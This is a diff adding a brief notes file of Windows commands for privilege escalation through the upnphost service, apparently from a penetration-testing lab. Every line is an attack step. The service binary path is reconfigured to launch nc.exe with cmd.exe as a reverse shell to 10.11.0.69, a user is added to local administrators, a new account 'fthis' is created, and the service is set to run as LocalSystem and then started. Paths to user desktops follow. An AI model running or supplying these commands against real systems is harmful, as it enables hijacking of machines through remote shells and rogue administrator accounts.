@@ -1,0 +1,21 @@
+
+C:\> sc qc upnphost
+
+C:\> sc config upnphost binpath= "C:\Inetpub\Scripts\nc.exe -nv 10.11.0.69 80 -e C:\WINDOWS\System32\cmd.exe"
+
+sc config upnphost binpath= "net localgroup administrators IWAM_BOB /add"
+
+sc config upnphost binpath= "net user /add fthis fthis222!"
+
+C:\> sc config upnphost obj= ".\LocalSystem" password= ""
+C:\> sc qc upnphost
+C:\> net start upnphost
+
+Dependencies?
+sc config SSDPSRV start= auto
+
+more 
+
+
+C:\Documents and Settings\bob\"My Documents"
+C:\Documents and Settings\Administrator\Desktop
